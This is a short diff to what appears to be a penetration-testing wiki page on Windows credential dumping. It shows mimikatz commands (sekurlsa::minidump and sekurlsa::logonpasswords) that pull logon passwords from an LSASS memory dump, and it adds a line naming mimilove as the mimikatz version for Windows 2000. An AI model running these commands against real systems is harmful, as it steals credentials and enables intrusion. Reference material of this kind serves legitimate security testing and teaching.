@@ -48,6 +48,8 @@ sekurlsa::logonpasswords
 sekurlsa::minidump lsass.dmp
 sekurlsa::logonpasswords
 ```
+
+For Windows 2000, a special version of mimikatz called mimilove can be used.
 {% endtab %}
 
 {% tab title="Pypykatz" %}
